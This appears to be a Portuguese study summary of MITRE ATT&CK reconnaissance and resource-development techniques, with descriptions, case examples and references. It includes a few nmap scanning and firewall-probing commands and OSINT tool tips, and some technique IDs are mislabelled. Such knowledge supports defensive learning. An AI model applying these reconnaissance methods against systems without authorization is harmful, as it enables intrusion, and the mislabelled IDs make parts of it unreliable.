###  Táticas Empresariais

**Descrição:** As táticas representam o “porquê” de uma técnica, seria o objetivo tático de um adversário, a razão para realizar uma ação.

### TA0043: Reconhecimento

**Descrição:** O reconhecimento é a fase que o adversário reuni todos os tipos de informações que possam usar para planejar ações futuras. Consiste em técnicas variadas como por exemplo: Coleta de informações sobre detalhes das organizações, informações das vítimas, infraestrutura, etc.

**TÉCNICAS USADAS**: 
          
T1595 **VARREDURA:** É quando os adversários executam varreduras de reconhecimento afim de coletar informações. Os métodos de varreduras podem ser realizada de várias maneiras, como recurso de protocolo de rede ICMP, essa varredura nos possibilita informações para revelar outras formas de reconhecimento, como sites, banco de dados, serviços, etc.

.001 **VARREDURA DE IPS:** Os atacantes eles enumeram os blocos de Ips para coletar informações como hosts atribuídos aos endereços, etc. As varreduras podem variar de pings simples a varreduras mais sutis que podem revelar softaware/versões dos hosts por meio de banners entre outros.

**Exemplo da Técnica:** Um grupo de hackers chamado TeamTNT usou a engenharia social e os temas que estava em alta na epoca para infectar vítimas, obtendo informações de seus hosts. Eles se passaram por pessoas honestas prestando serviços de Pentest.


.002 **VERIFICAÇÃO DE VULNERABILIDADE:** Consiste por escanear a vítima em buscas de vulnerabilidades para ser usadas, elas verificam normalmente a configuração de um host, versão de um software, versão de banners, portas abertas, etc.

**Exemplo da Técnica:** Um grupo de hacker realizavam varreduras em larga escala em portas especificas em computadores de todo o mundo, essá foi uma tentativa de encontrar vulnerabilidades nos Hosts, uma opção de varredura de vulnerabilidades é o Nmap -F (ip) que realiza uma varredura de portas.

T1592 **REUNINDO INFORMAÇÕES DAS VÍTIMAS:** Os adversários coletam informações sobre os hosts das vítimas que podem ser usadas, as informações variam entre detalhes administrativo, exemplos: Nome, Ip funcionalidade, etc. E detalhes sobre sua configuração sistemática. As maneiras de como os atacantes coletam as informações são as mais variadas possíveis, pode ser por meio de varredura ativa ou de phishing, compremeter sites e incluir conteudos maliciosos, etc.

**Exemplo da Técnica:** Um email de phishing ou SMiShing é enviado para a vítima com intuito da mesma inserir dados que o atacante pretende capturar, uma outra maneira de capturar dados é usando o SHODAN para captura de banners detalhados como Ip, versões de Hosts, etc

.001 **HARDWARE:** Bastante semelhante a anterior os adversários coletam informações sobre o hardware do host da vítima que podem ser usados, como informações sobre infraestrutura que podem incluir detalhes como tipo de versões de hosts e como componentes, como por exemplo: Leitores biométricos/Cartão, etc. As informações sobre infraestrutura de hardware são expostas aos adversários por meio de conjuntos de dados como anúncios de emprego, mapas de redes curriculos, etc.

.002 **SOFTWARE:** Semelhante a anterior os atacantes podem coletar informações do software do host como variedades de datalhes como versões, presenã de componentes, proteções defensivas, etc. A coleta pode ser por Active scanning ou phishing. Ex: Inserir um script malicioso em sites comprometidos para coletar informações da vítima, como tipo de navegador, linguagem do sistema, etc.

**Exemplo da Técnica:** Comprometer um site e incluir um código carregando um arquivo JS malicioso de um servidor remoto, Uma estrutura chamada sandbox inclui algumas técnicas, ela tem uma estrutura que coleta pequenos dados de informações sobre as vítimas.

.003 **Firmware:** As informaçõa que podem ser capturados incluem tipo e versões específicos, condiguração, nivel de idade/patch, etc. A coleta pode variar, diretamente é usado o Phishing, informações sobre o host é exposto via online, como postagens, mapas de rede, relatórios de avaliação, currículum ou fatura de compras.

**Exemplo da Técnica:** Um grupo obteve informações da intel pois elas estavam em um servidor inseguro hospedado na akamai, o servidor foi identificado usando a varredura de portas do NMAP e usou um script em python para advinhar senhas padrão.

.004 **Configuração do cliente:** Na coleta de informações dos clientes podem incluir uma variedade de detalhes e configurações, incluindo sistemas operacionais/versão, virtualização, arquitetura, idioma e/ou fuso horário. Como dito anteriormente essa técnica pode tambem ser usada o phishing ou o escaneamente, Sites podem ser comprometidos e incluir conteúdo malicioso projetado para coletar informações.

**Exemplo da técnica:** Ao explorar as vulnerabilidades um grupo implantou shells web no servidor comprometido, isso permitia que os invasores roubem dados e realizem ações maliciosas. O código maliciosa foi escrito em ASP.

**REFERENCIA:** https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

T1859 **IDENTIDADE DA VÍTIMA:** As coletas podem incluir detalhes como dados pessoais, nomes de funcionários, endereços de e-mail, etc. Detalhes confidenciais como credenciais via phishing. Exemplos desses procedimentos é realização de vigilância direcionada contra ativistas e blogueiros, ou adquirir números de telefone para malware mobile.

.001 **Credenciais:** Os atacantes coletam informações de potenciais vítimas de várias maneiras, a mais comum é usando phishing, os atacantes tentam aproveitar a tendêcia de usuarios usarem as mesmas senhas em contas pessoais e comerciais.

**Exemplo da técnica:** Foi usado Phishing para capturar credênciais nas eleições norte americana, tambem usaram força bruta e spray de senha, a partir daí automatizaram seus aspectos e os ataques ocorriam de 2 maneiras, era executado através de mais de 1000 Ips rotativos, usando o anonimato do TOR.

**REFERENCIA:** https://blogs.microsoft.com/on-the-issues/2020/09/10/cyberattacks-us-elections-trump-biden/

.002 **Endereços de E-mail:** Esses dados podem estar prontamente disponíveis e expostos online com outros dados acessíveis, a coleta dessas informações podem dar oportunidades de outras formas de reconhecimento como pesquisar sites abertos, dominios ou até mesmo phishing, estabelecendo recursos operacionais.

**Exemplos de procedimentos:** Coletar endereços de e-mail, a fim de direcioná-los com spyware, pegar endereços de e-mail válidos para realizar brute force.

**REFERENCIA:** https://www.amnestyusa.org/wp-content/uploads/2021/02/Click-and-Bait_Vietnamese-Human-Rights-Defenders-Targeted-with-Spyware-Attacks.pdf

.002 **Nome de funcionários:** Nome de usuários são usados para obter endereços de e-mail bem como ajudar orientar outros esforços de reconhecimento e criar iscas.

**Exemplos de procedimento:** Houve uma intrussões contra um ataque em uma rede elétrica da Ucrânia , invadiram os sistemas pertencênte a 3 empresas,os Conspirators usaram e-mails de spearphishing para obter acesso às três redes de distribuição de energia.

**REFERÊNCIA:** https://www.justice.gov/opa/press-release/file/1328521/download


T1590 **INFORMAÇÕES DA REDE DA VÍTIMA:** Os atacantes reunem informações sobre redes, que incluem uma variedade de detalhes, incluindo dados adminitrativos exemplos: Faixas de IP, nome de dominios, etc. Bem como especificações sobre sua topoligia e operações. Os atacantes conseguem essas informações via active scanning ou phishing. 

.001 **Propriedade de domínio:** Os atacantes coletam informações sobre os dóminios de rede da vítima, informações sobre domínios e suas propriedades inclui detalhes como quais domínios a vítima possui, bem como dados administrativos. A coleta dessas informações podem variar, como na base de escaneamento ou phishing, essas informações podem estar expostas para os atacante online acessiveis como o WHOIS..

**Exemplos de procedimento:** Com uso do Whois podemos pegar informações de data de criação do Domomnio, data que expira, sites disponíveis,etc. 

**REFERÊNCIA:** https://docs.microsoft.com/pt-br/troubleshoot/windows-server/networking/research-internet-domains-with-whois

.002 **DNS:** Os atacantes podem coletar informações sobre o Dns das vítimas, os detalhes dessas informação são nomes registrados dos servidores, servidores de e-mail, etc. A maneira de como se coleta esses dados podem variar, como consultar ou coletar detalhes via Dns passivo, as informações tambem podem ser expostas a adversários online.

**Exemplo de procedimentos:** Existe o site DNSDumpster.com que com uma simples pesquisa você consegue colher dados DNS.

**REFERÊNCIA:** https://dnsdumpster.com/

.003 **Dependâncias de confiança de rede:** Os atacantes coletam informações sobre os trusts da rede, dominios de terceiros ex: provedores de serviços gerenciados, contratantes, etc. Das mesmas formas como as anteriores, pode se obter essas informações atraves de Phishing, essas tais informações também podem estar disponiveis aos atacantes expostas em pesquisas de banco de dados técnicos abertos.

.004 **Topologia de redes:** Os adversários conseguem informações da topologia da rede como arranjo fisico ou lógico dos ambientes, pode haver detalhes como gateways, roteadores, etc. A maneira que se coleta essas informações é via escaneamento ou phishing.

**Exemplos de procedimento:** Podemos realizar phishing ou escanemento para obter essas informações.

.005 **Endereços IP:** O atacante reuni os Ips das vítimas para ser usados, os endereços IP públicos podem ser alocados por blocos, as informações podem ser detalhadas como quais endereços de Ips estão em uso, isso pode permitir que o atacante obtenha detalhes sobre uma vítima como organização, localização física, provedor de internet, etc. Um exemplo dessa técnica foi um grupo de espionagem que obteve endereços de Ips para servidores exchange acessíveis ao público.

**Exemplos de procedimento:** Um exemplo foi um serviço de monitoramento detectouuma grande quantidade de dados sendo enviados para endereços Ips, estava sendo webshells sendo executado através de modulo Http malicioso, a intenção era explorar uma vulnerabilidade de falsificação de solicitação de servidor, o intuito era roubar caixas de correio de usuarios.

**REFERÊNCIA:** https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/

.006 **Aparelhos de segurança de rede:** Os adversários podem colher informações sobre os dispositivos de segurança de rede como existência e as especificidades de firewalls implantados, filtros de conteúdo e hosts, etc.

**Exemplos de procedimento:** Com o nmap podemos usar recursos para entender redes, verificar filtros,etc comandos: nmap -sS -T4 (site) e nmap -sA -T4 (site) nos trás informações sobre firewalls, filtros.

**REFERÊNCIA:** https://nmap.org/book/firewalls.html

T1591 **INFORMAÇÕES DA ORGANIZAÇÃO DA VÍTIMA:** Os adversários coletam informações sobre a organização da vítima, informações como nomes, divisões, departamentos, especificidades de operações e negócios. Essas informações podem ser coletadas por phishing.

.001 **Determinar localizações físicas:** Os adversários reunem os locais físicos da vítima, os detalhes das informações incluem variedades de detalhes, incluindo os principais recursos e onde os principais recursos estão alojados, esses dados podem ser obtidos através de phishing.

**Exemplos de procedimentos:** um endereço IP público. Você pode ver a que país pertence, a que cidade e até mesmo as coordenadas aproximadas. A primeira coisa que precisamos fazer é descobrir em qual IP estamos interessados. E com phishing isso pode ficar muito mais fácil

.002 **Relacionamento de Negócio:** Os adversários coletam informações sobre as relações comerciais da vítima que podem ser usadas, as informações podem incluir organizações/Dominios de terceiros, como provedores de serviços gerenciados, contratantes, etc. As informações podem revelar suprimentos e caminhos para recurso de hardware e software da vítima. As informações podem ser obtidas através de phishing

.003 **Tempo de Negocio:** Coleta de informações sobre o tempo de negócios de uma organização podem incluir uma variedade de detalhes, incluindo horas/dias operacionais da semana. Essas informações também podem revelar horários/datas de compras e envios dos recursos de hardware e software da vítima. podem coletar essas informações de várias maneiras, como a obtenção direta via Phishing.

**Exemplos de procedimentos:** Um grupo de hackers realizaram spearphishing, implantando malware com intençao de sondar redes de computadores das vítimas; registrar sites e domínios maliciosos com nomes
imitando os legítimos; enviar e-mails de spearphishing; armazenar e distribuir
malware;  gerenciar malware; transferir dados roubados; e  influenciar negativamente o público.

**REFERÊNCIA:** https://www.justice.gov/opa/press-release/file/1328521/download

.004 **Identificar funções:** Coleta de informações sobre funções de negócios podem revelar uma variedade de detalhes direcionados, incluindo informações identificáveis para pessoal-chave, bem como a quais dados/recursos eles têm acesso. podem coletar essas informações de várias maneiras, como a obtenção direta via Phishing for Information

T1598 ** PHISHING PARA INFORMAÇÕES:** Os adversários podem enviar mensagens de phishing para obter informações confidenciais que podem ser usadas durante o direcionamento. Phishing para informações é uma tentativa de enganar os alvos para divulgar informações, credenciais frequentes ou outras informações acionáveis. Phishing para informações é diferente do Phishing, pois o objetivo é coletar dados da vítima em vez de executar códigos maliciosos.

.001 **Serviço de Spearphishing:** Os adversários podem enviar mensagens de spearphishing através de serviços de terceiros para obter informações confidenciais que podem ser usadas durante o direcionamento. Spearphishing para obter informações é uma tentativa de enganar os alvos para divulgar informações, credenciais frequentes ou outras informações acionáveis.

**Exemplo de procedimento:**  A vítima recebe um e-mail de uma empresa ou de um contato familiar contendo um link ou um anexo, a mensgaem pode parecer confiavel, mas não é.

.002 **Anexo de Spearphishing:** Os adversários podem enviar mensagens de spearphishing com um anexo malicioso para obter informações confidenciais que podem ser usadas durante o direcionamento.

**Exemplo de procedimento:** O malware Guildma tem como alvo usuários bancários exclusivamente do brasil, depende fortemente de fotos de e-mail contendo um arquivo malicioso formato compactado anexado ao corpo de e-mail, os tipos de arquivos variam de Visual Basic Script para LNK. A maioria das mensagens de phishing emulam pedidos de negócios.

**REFERÊNCIA:** https://securelist.com/the-tetrade-brazilian-banking-malware/97779/

.003 **Spearphishing Link:** Os adversários podem enviar mensagens de spearphishing com um link malicioso para obter informações confidenciais que podem ser usadas durante o direcionamento.

**Exemplo de procedimento:** Quando os usuáirios visitam uma página com uma cadeia de infecções, um java scrip malicioso é carregado, o script varia entre diferentes páginas infectadas, mas geralmente em duas partes. O primeiro script captura e armazena informações sobre os visitantes. O segundo script visa baixar uma falsa atualização do software ou documento. O malware baixado é configurado com base no navegador do usuário.

**REFERÊNCIA:** https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/

T1597 **PESQUISA DE FONTES FECHADAS:** Os adversários podem procurar e coletar informações sobre vítimas de fontes fechadas que podem ser usadas durante o direcionamento. Informações sobre vítimas podem estar disponíveis para compra de fontes privadas e bancos de dados respeitáveis, como assinaturas pagas para feeds de dados técnicos/de inteligência de ameaças

.001 **Fornecedores de informações de ameaças:** Os adversários podem pesquisar dados privados de fornecedores de inteligência de ameaças para obter informações que possam ser usadas durante o direcionamento. Os fornecedores de inteligência de ameaças podem oferecer feeds ou portais pagos que ofereçam mais dados do que o que é relatado publicamente.

.002 **Dados para compra:** Os adversários podem adquirir informações técnicas sobre vítimas que podem ser usadas durante o direcionamento. Informações sobre vítimas podem estar disponíveis para compra em fontes e bancos de dados privados respeitáveis, como assinaturas pagas para feeds de bancos de dados de varredura ou outros serviços de agregação de dados.

**Exemplo de procedimento:** Dados bancários são vendidos constantemente, os dados são capturados por phishing ou vírus.

**REFERÊNCIA:** https://g1.globo.com/tecnologia/blog/seguranca-digital/post/saiba-como-criminosos-roubam-dados-bancarios-no-brasil.html

T1596 **BANCO DE DADOS TÉCNICOS ABERTOS:** Os adversários podem procurar bancos de dados técnicos disponíveis livremente para obter informações sobre vítimas que possam ser usadas durante o direcionamento. Informações sobre vítimas podem estar disponíveis em bancos de dados e repositórios online, como registros de domínios/certificados, bem como coletas públicas de dados/artefatos de rede coletados a partir de tráfego e/ou varreduras.

.001 **Dns/Dns passivo:** Os adversários podem pesquisar dados do DNS para obter informações sobre vítimas que possam ser usadas durante o direcionamento. As informações do DNS podem incluir uma variedade de detalhes, incluindo servidores de nomes registrados, bem como registros que delineiam o endereçamento para subdomínios de um alvo, servidores de e-mail e outros hosts.

**Exemplo de procedimento:** Existe o CIRCL Passive DNS é um banco de dados que armazena registros históricos de DNS de vários recursos, incluindo análise de malware ou parceiro. Os dados do DNS são indexadaos o que torna pesquisável para manipuladores, existe uma API REST com formato de saída JSON. 

**REFERÊNCIA:** https://www.circl.lu/services/passive-dns/

.002 **Whois:** Os adversários podem pesquisar dados públicos do WHOIS em busca de informações sobre vítimas que possam ser usadas durante o direcionamento. Os dados do WHOIS são armazenados por registros regionais da Internet (RIR) responsáveis pela alocação e atribuição de recursos da Internet, como nomes de domínio. 

**Exemplo de procedimento:** O WHOIS, cujo nome vem da expressão de língua inglesa “who is” (quem é), é um mecanismo que registra domínios, IPs e sistemas autônomos na Internet e que serve para identificar o proprietário de um site. Alimentado por companhias de hospedagem, ele reúne todas as informações pertencentes a uma página, seja ela atrelada, no Brasil, a um CNPJ ou a um CPF.Tecnicamente falando, o WHOIS é um protocolo TCP que tem como objetivo consultar contato e DNS.

**REFERÊNCIA:** https://www.techtudo.com.br/noticias/2015/03/o-que-e-whois.ghtml

.003 **Certificados Digitais:** Os adversários podem pesquisar dados públicos de certificados digitais para obter informações sobre vítimas que possam ser usadas durante o direcionamento. Os certificados digitais são emitidos por uma autoridade de certificado (CA) a fim de verificar criptograficamente a origem do conteúdo assinado.

.003 **CDNs:** Os adversários podem pesquisar dados da rede de entrega de conteúdo (CDN) sobre vítimas que podem ser usados durante o direcionamento. Os CDNs permitem que uma organização hospede conteúdo de um conjunto distribuído e equilibrado de servidores.

.004 **Digitalizar banco de dados:** Os adversários podem procurar em bancos de dados públicos de varredura informações sobre vítimas que possam ser usadas durante o direcionamento. Vários serviços online publicam continuamente os resultados de varreduras/pesquisas na Internet, muitas vezes coletando informações como endereços IP ativos, nomes de host, portas abertas, certificados e até banners de servidores.

T1593 **PESQUISAR SITES/ DOMÍNIOS ABERTOS:** Os adversários podem procurar livremente sites e/ou domínios disponíveis para obter informações sobre vítimas que possam ser usadas durante o direcionamento. Informações sobre vítimas podem estar disponíveis em vários sites online, como mídias sociais, novos sites ou aquelas que hospedam informações sobre operações comerciais, como contratação ou contratos solicitados/recompensados

.001 **Midias Sociais:** Os adversários podem procurar nas redes sociais informações sobre vítimas que possam ser usadas durante o direcionamento. Sites de mídia social podem conter várias informações sobre uma organização de vítimas, como anúncios de negócios, bem como informações sobre os papéis, locais e interesses dos funcionários.

.002 **Mecanismo de Busca:** Os adversários podem usar mecanismos de busca para coletar informações sobre vítimas que podem ser usadas durante o direcionamento. Os serviços de mecanismos de busca típicos rastreiam sites on-line para indexar o contexto e podem fornecer aos usuários uma sintaxe especializada para procurar palavras-chave específicas ou tipos específicos de conteúdo (ou seja, tipos de arquivos).

T1594 **SITES DE PROPRIEDADE DE VÍTIMAS:** Os adversários podem procurar sites de propriedade da vítima para obter informações que possam ser usadas durante o direcionamento. Sites de propriedade da vítima podem conter uma variedade de detalhes, incluindo nomes de departamentos/divisões, locais físicos e dados sobre funcionários-chave, como nomes, funções e informações de contato (ex: Endereços de E-mail). Esses sites também podem ter detalhes destacando operações comerciais e relacionamentos.


TA0042 **DESENVOLVIMENTO DE RECURSOS:** 

O Desenvolvimento de Recursos consiste em técnicas que envolvem adversários criando, comprando ou comprometendo/roubando recursos que podem ser usados para apoiar o direcionamento. Tais recursos incluem infraestrutura, contas ou recursos. Esses recursos podem ser aproveitados pelo adversário para ajudar em outras fases do ciclo de vida adversário, como usar domínios comprados para apoiar comando e controle, contas de e-mail para phishing como parte do Acesso Inicial ou roubar certificados de assinatura de código para ajudar com a Evasão de Defesa.

.001 **Adquirir infraestrutura:** Os adversários podem comprar, alugar ou alugar infraestrutura que possa ser usada durante o direcionamento. Existe uma grande variedade de infraestrutura para hospedagem e orquestração de operações adversárias. As soluções de infraestrutura incluem servidores físicos ou em nuvem, domínios e serviços web de terceiros. Além disso, botnets estão disponíveis para aluguel ou compra. 

.002 **Servidor DNS:** Os adversários podem configurar seus próprios servidores DNS (Domain Name System, sistema de nomes de domínio) que podem ser usados durante o direcionamento. Durante a atividade pós-compromisso, os adversários podem utilizar o tráfego de DNS para várias tarefas, incluindo para Comando e Controle (ex: Protocolo de Camada de Aplicativo). Em vez de sequestrar os servidores DNS existentes, os adversários podem optar por configurar e executar seus próprios servidores DNS em suporte a operações.

.003 **Servidor Privado Virtual:** Os adversários podem alugar VPSs (Virtual Private Servers, servidores privados virtuais) que podem ser usados durante o direcionamento. Existe uma variedade de provedores de serviços em nuvem que venderão máquinas/contêineres virtuais como um serviço. Ao utilizar um VPS, os adversários podem dificultar a vincular fisicamente as operações de volta a eles. O uso da infraestrutura em nuvem também pode facilitar que os adversários provisionem, modifiquem e desliguem rapidamente sua infraestrutura.

.004 **Servidor:** Os adversários podem comprar, alugar ou alugar servidores físicos que possam ser usados durante o direcionamento. O uso de servidores permite que um adversário enloucoe, lance e execute uma operação. Durante a atividade pós-compromisso, os adversários podem utilizar servidores para várias tarefas, inclusive para Comando e Controle. Em vez de comprometer um Servidor de terceiros ou alugar um Servidor Virtual Privado, os adversários podem optar por configurar e executar seus próprios servidores em suporte a operações.

.005 **Botnet:** Os adversários podem comprar, alugar ou alugar uma rede de sistemas comprometidos que podem ser usados durante o direcionamento. Uma botnet é uma rede de sistemas comprometidos que podem ser instruídos a executar tarefas coordenadas.[1] Os adversários podem comprar uma assinatura para usar uma botnet existente a partir de um serviço de booter/stresser. Com uma botnet à sua disposição, os adversários podem realizar atividades de follow-on, como phishing em larga escala ou Negação distribuída de Serviço (DDoS)

.006 **Serviços Web:** Os adversários podem se registrar para serviços web que podem ser usados durante o direcionamento. Existem vários sites populares para que os adversários se inscrevam em um serviço baseado na Web que pode ser abusado durante estágios posteriores do ciclo de vida adversário

T1586 **CONTAS DE COMPROMISSO:** Os adversários podem comprometer contas com serviços que podem ser usados durante o direcionamento. Para operações de engenharia social, a utilização de uma persona online pode ser importante. Em vez de criar e cultivar contas (ou seja, estabelecer contas), os adversários podem comprometer as contas existentes. 

.001 **Contas de mídia social:** Os adversários podem comprometer contas de mídia social que podem ser usadas durante o direcionamento. Para operações de engenharia social, a utilização de uma persona online pode ser importante. 

.002 **Contas de E-mail:** Os adversários podem comprometer contas de e-mail que podem ser usadas durante o direcionamento. Os adversários podem usar contas de e-mail comprometidas para promover suas operações, como usá-las para realizar phishing para informações ou phishing.

T1587 **DESENVOLVENDO RECURSOS:** Os adversários podem criar recursos que podem ser usados durante o direcionamento. Em vez de comprar, baixar ou roubar recursos gratuitamente, os adversários podem desenvolver suas próprias capacidades internamente. Este é o processo de identificação de requisitos de desenvolvimento e construção de soluções como malware, explorações e certificados auto-assinados. 

.001 **Malware:** Os adversários podem desenvolver componentes de malware e malware que podem ser usados durante o direcionamento. A construção de softwares maliciosos pode incluir o desenvolvimento de cargas, conta-gotas, ferramentas pós-compromisso, backdoors (incluindo imagens backdoored), empacotadores, protocolos C2 e a criação de mídias removíveis infectadas

.002 **Certificados de assinatura de código:** Os adversários podem criar certificados de assinatura de código auto-assinados.A assinatura de código é o processo de assinatura digital de executáveis e scripts para confirmar o autor do software e garantir que o código não tenha sido alterado ou corrompido. A assinatura de código fornece um nível de autenticidade para um programa do desenvolvedor e uma garantia de que o programa não foi adulterado.

.003 **Certificados Digitais:** Os adversários podem criar certificados SSL/TLS auto-assinados que podem ser usados durante o direcionamento. Os certificados SSL/TLS são projetados para incutir confiança. Eles incluem informações sobre a chave, informações sobre a identidade de seu proprietário e a assinatura digital de uma entidade que verificou o conteúdo do certificado estão corretas.

.004 **Exploit:** Os adversários podem desenvolver explorações que podem ser usadas durante o direcionamento. Uma exploração se aproveita de um bug ou vulnerabilidade para causar comportamentos não intencionais ou imprevistos a ocorrer em hardware ou software de computador. Em vez de encontrar/modificar explorações de on-line ou comprá-las de fornecedores de exploração, um adversário pode desenvolver suas próprias façanhas.

T1585 **ESTABELECER CONTAS:** Os adversários podem criar e cultivar contas com serviços que podem ser usados durante o direcionamento. Os adversários podem criar contas que podem ser usadas para construir uma persona para outras operações. O desenvolvimento de personas consiste no desenvolvimento de informações públicas, presença, história e afiliações apropriadas. Esse desenvolvimento pode ser aplicado em mídias sociais, site ou outras informações disponíveis publicamente que possam ser referenciadas e examinadas por legitimidade ao longo de uma operação usando essa persona ou identidade.

.001 **Contas de mídia social:** Os adversários podem criar e cultivar contas de mídia social que podem ser usadas durante o direcionamento. Os adversários podem criar contas de mídia social que podem ser usadas para construir uma persona para outras operações. O desenvolvimento de personas consiste no desenvolvimento de informações públicas, presença, história e afiliações apropriadas.

.002 **Contas de email:** Os adversários podem criar contas de e-mail que podem ser usadas durante o direcionamento. Os adversários podem usar contas criadas com provedores de e-mail para promover suas operações, como usá-las para realizar phishing para informações ou phishing. Os adversários também podem tomar medidas para cultivar uma persona em torno da conta de e-mail, como através do uso de Contas de Mídia Social, para aumentar a chance de sucesso de comportamentos de acompanhamento.

T1588 **OBTER RECURSOS** Os adversários podem comprar e/ou roubar recursos.Em vez de desenvolver suas próprias capacidades internamente, os adversários podem comprar, baixar livremente ou roubá-las. As atividades podem incluir a aquisição de malware, software (incluindo licenças), explorações, certificados e informações relacionadas a vulnerabilidades. 

.001 **Malware:** Os adversários podem comprar, roubar ou baixar malwares, software maliciosos podem incluir, payloads, droppers, post compromise tools, backdoors, packers, etc. Geralmente são adquiridos para apoiar suas operações, na maioria das vezes para manter conectividade e o controle de máquinas remotas.

**Exemplo de procedimento:** Um grupo de hackers chamado turla adquiriram ferramentas e dados necessários para us=a-las, testou contra vítimas que tinham já comprometido usando um kit de ferramenta Snake e em seguida implantaram as ferramentas iranianas.

**REFERÊNCIA:** https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf

.002 **Ferramenta:** Da mesma maneira que a anterior podem adquirir códigos abertos ou fechados, gratuitamente ou comerciais. Uma ferramenta pode ser usado para fins maliciosos por um adversário, mas ao contrário do malware não foiram destinados a ser usados para esse fim. A aquisição de ferramentas pode envolver a aquisição de licenças de software comercial, inclusive para ferramentas de equipe vermelhas, como o Cobalt Strike. 

**Exemplo de procedimento:** O atacante usou uma ferramenta disponível publicamente chamada SensePost's Ruler, para configurar uma regra de e-mail do lado do cliente, criada para baixar e execitar uma carga de carga maliciosa de um servidor WebDav controlado pelo adversário.

**REFERÊNCIA:** https://www.mandiant.com/resources/overruled-containing-a-potentially-destructive-adversary

.003 **Certificados de Asssinatura de Código:**  A assinatura de código é o processo de assinatura digital de executáveis e scripts para confirmar o autor do software e garantir que o código não tenha sido alterado ou corrompido. A assinatura de código fornece um nível de autenticidade para um programa do desenvolvedor e uma garantia de que o programa não foi adulterado.

**Exemplo de procedimento:**  MegaCortex é um ransomware, eles são inicialmente compilados usando MV C ++, e todos usam uma biblioteca de criptografia, para contornar os controles de segurança que não executam códigos não assinados em máquinas windowns, ele usa arquivos assinados para infectar dispositivos.

**REFERÊNCIA:** https://securityintelligence.com/posts/from-mega-to-giga-cross-version-comparison-of-top-megacortex-modifications/

.004 **Certificados Digitais:** Os certificados SSL/TLS são projetados para incutir confiança. Eles incluem informações sobre a chave, informações sobre a identidade de seu proprietário e a assinatura digital de uma entidade que verificou o conteúdo do certificado estão corretas.

**REFERÊNCIA:** https://www.phishlabs.com/blog/silent-librarian-more-to-the-story-of-the-iranian-mabna-institute-indictment/

.005 **Exploit:** Um exploit se aproveita de um bug ou vulnerabilidade para causar comportamentos não intencionais ou imprevistos a ocorrer em hardware ou softaware do computador, ao invés de desenvolver o seu prórprio exploit o atacante pode encontrar online e comprá-las de fornecedores.

**Exemplo de procedimentos:** Para uso de exploits os atacantes precisam conhecer vulnerabilidades do sistema que pretende invadir. O exploite se espalha por uma rede sem precisar de interação, os próximos passados depende do objetivo dos atacantes.

**REFERÊNCIA:** https://canaltech.com.br/seguranca/o-que-e-exploit-203850/

.006 **Vulnerabilidades:** Os adversários podem adquirir informações sobre vulnerabilidades que podem ser usadas durante o direcionamento. Uma vulnerabilidade é uma fraqueza no hardware ou software de computador que pode, potencialmente, ser explorado por um adversário para causar comportamentos não intencionados ou imprevistos. Os adversários podem encontrar informações de vulnerabilidade pesquisando bancos de dados abertos ou obtendo acesso a bancos de dados de vulnerabilidades fechados.

** Exemplo de procedimento:** Houve uma campanha de spearphishing para adquirir informações de uma empresa de usina de energia elétrica. Onde teve acesso as informações previlegiadas para realizar o restante do golpe.

**REFERÊNCIA:** https://www.justice.gov/opa/press-release/file/1328521/download

T1608 **RECURSOS DE PALCO:** Os adversários podem carregar, instalar ou configurar recursos. Para apoiar suas operações, um adversário pode precisar pegar os recursos que desenvolveu (Desenvolver recursos) ou obtidos (Obter recursos) e envolvê-los em infraestrutura sob seu controle. Uma preparação de recursos pode ajudar o adversário em uma série de comportamentos, como: Encenando recursos da Web, Encenar recursos para alvo de link com spearphishing, Upload de malware, instalação do certificado SSL/TLS.

.001 **Carregamento de Malware:** Os adversários podem carregar malware para infraestrutura controlada por terceiros para torná-lo acessível.

**Exemplo de procedimento:** Indivíduos são alvos de sites falsos de algumas maneiras, Através de framewprks de criação de perfil, A segunda é direcionar as vítimas que são enviadas links para noticias específicas contendo a lógica de entrega de malware de phishing de lançamentos de mensagens, Quando acessa o site o javascript malicioso é carregado, e o primeiro script captura e armazena informações, o segundo script baixa uma atualização falsa.

**REFERÊNCIA:** https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/

.002 **Ferramenta de Upload:** Os adversários podem carregar ferramentas para apoiar suas operações, como disponibilizar uma ferramenta para uma rede de vítimas para habilitar a transferência de ferramentas de Ingress, colocando-a em um servidor web acessível à Internet.

**Exemplo de procedimentos:** Plug x é uma ferramenta que é usada para acesso remoto, ele em um sistema comprometido permite que um atacante execute grande variedade de comandos, incluindo upload e downloads, e coloca um shell reverso.

**REFERÊNCIA:** https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage

.003 **Instalação de Certificado Digital:** s certificados SSL/TLS são arquivos que podem ser instalados em servidores para permitir comunicações seguras entre sistemas. Os certificados digitais incluem informações sobre a chave, informações sobre a identidade de seu proprietário e a assinatura digital de uma entidade que verificou que o conteúdo do certificado está correto

**Exemplo de procedimento:** Os adversários podem instalar certificados SSL/TLS que podem ser usados para promover suas operações, como criptografar o tráfego C2 ou dar credibilidade a um local de coleta de credenciais. A instalação de certificados digitais pode ocorrer para vários tipos de servidores, incluindo servidores web e servidores de e-mail.

**REFERÊNCIA:** https://www.digicert.com/kb/ssl-certificate-installation.htm

.004 **Alvo de Drive-by:** Os adversários podem preparar um ambiente operacional para infectar sistemas que visitam um site durante o curso normal de navegação. Os sistemas de ponto final podem ser comprometidos através da navegação para sites controlados por adversários, como no Drive-by Compromise. Nesses casos, o navegador da Web do usuário é normalmente direcionado para exploração (muitas vezes não requerendo qualquer interação extra do usuário uma vez que aterrissa no site), mas os adversários também podem configurar sites para comportamentos de não exploração, como o Application Access Token. 

**Exemplo de procedimento:** Baseado na vulnerabilidade CVE-2011-3544 um burcado de segurança em java para comprometer seus alvos, A ferranebta chamada PlugX que da acesso remoto. Os visitantes de sites explorados por um grupo hacker são direcionados por um código incorporado nos sites para uma web maliciosa que exibe seu dereço de IP, se o Ip estiver dentro de intervalor que estão interessados o site espera que sua próxima exibição de página deixe cair uma exploraçãpo no Pc.

**REFERÊNCIA: ** https://arstechnica.com/information-technology/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/

